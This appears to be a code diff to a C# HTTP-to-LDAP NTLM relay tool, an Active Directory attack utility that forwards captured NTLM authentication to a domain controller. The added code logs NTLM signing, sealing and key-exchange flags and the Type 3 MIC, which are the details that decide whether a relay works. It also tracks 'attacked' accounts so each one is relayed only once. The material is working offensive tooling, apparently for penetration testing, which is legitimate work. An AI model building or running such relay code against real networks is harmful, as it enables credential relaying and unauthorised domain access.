@@ -200,6 +200,7 @@ namespace HttpLdapRelay
         private void Handle_NtlmType1(HttpListenerContext context, byte[] ntlmType1, string clientIp, string authType)
         {
             LogVerbose($"[*] Type 1 data ({ntlmType1.Length} bytes): {BitConverter.ToString(ntlmType1, 0, Math.Min(32, ntlmType1.Length))}...");
+            LogNtlmFlags(ntlmType1, 12, "Type 1 (client→relay)");
 
             // Create a new relay session
             var session = _sessionManager.CreateSession();
@@ -242,6 +243,7 @@ namespace HttpLdapRelay
 
             LogVerbose($"[+] Received NTLM Type 2 from LDAP ({type2Data.Length} bytes)");
             LogVerbose($"[*] Type 2 data: {BitConverter.ToString(type2Data, 0, Math.Min(32, type2Data.Length))}...");
+            LogNtlmFlags(type2Data, 20, "Type 2 (DC→relay)");
 
             // Send Type 2 back to HTTP client.
             // "Negotiate" is SPNEGO: the raw NTLM challenge must be wrapped in a
@@ -272,6 +274,8 @@ namespace HttpLdapRelay
         {
             LogVerbose("[*] NTLM Type 3 (Authenticate) received");
             LogVerbose($"[*] Type 3 data ({ntlmType3.Length} bytes): {BitConverter.ToString(ntlmType3, 0, Math.Min(32, ntlmType3.Length))}...");
+            LogNtlmFlags(ntlmType3, 60, "Type 3 (client→relay)");
+            LogNtlmType3Details(ntlmType3);
 
             if (string.IsNullOrEmpty(sessionCookie))
             {
@@ -292,6 +296,17 @@ namespace HttpLdapRelay
 
             string identity = ExtractUsernameFromType3(ntlmType3);
             LogVerbose($"[*] Relaying authentication for: {identity}");
+
+            lock (_attackedLock)
+            {
+                if (!_attackedAccounts.Add(identity))
+                {
+                    LogVerbose($"[*] Skipping duplicate attack for {identity}");
+                    SendSuccessResponse(context.Response);
+                    _sessionManager.RemoveSession(session.SessionId);
+                    return;
+                }
+            }
 
             // Send Type 3 to LDAP and inspect the BindResponse
             LdapResult bindResult;
@@ -624,6 +639,35 @@ namespace HttpLdapRelay
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine(message);
             Console.ResetColor();
+        }
+
+        private void LogNtlmFlags(byte[] ntlm, int flagsOffset, string label)
+        {
+            if (!_verbose || ntlm.Length < flagsOffset + 4) return;
+
+            uint flags = BitConverter.ToUInt32(ntlm, flagsOffset);
+            bool sign = (flags & 0x00000010) != 0;
+            bool seal = (flags & 0x00000020) != 0;
+            bool alwaysSign = (flags & 0x00008000) != 0;
+            bool keyExch = (flags & 0x40000000) != 0;
+
+            Console.WriteLine($"[*] {label} NegotiateFlags: 0x{flags:X8}");
+            Console.WriteLine($"[*]   NTLMSSP_NEGOTIATE_SIGN       = {sign}");
+            Console.WriteLine($"[*]   NTLMSSP_NEGOTIATE_SEAL       = {seal}");
+            Console.WriteLine($"[*]   NTLMSSP_NEGOTIATE_ALWAYS_SIGN= {alwaysSign}");
+            Console.WriteLine($"[*]   NTLMSSP_NEGOTIATE_KEY_EXCH   = {keyExch}");
+        }
+
+        private void LogNtlmType3Details(byte[] type3)
+        {
+            if (!_verbose || type3.Length < 88) return;
+
+            byte[] mic = new byte[16];
+            Array.Copy(type3, 72, mic, 0, 16);
+            bool micPresent = false;
+            for (int i = 0; i < 16; i++) { if (mic[i] != 0) { micPresent = true; break; } }
+
+            Console.WriteLine($"[*] Type 3 MIC (bytes 72-87): {BitConverter.ToString(mic)}");
         }
     }
 }
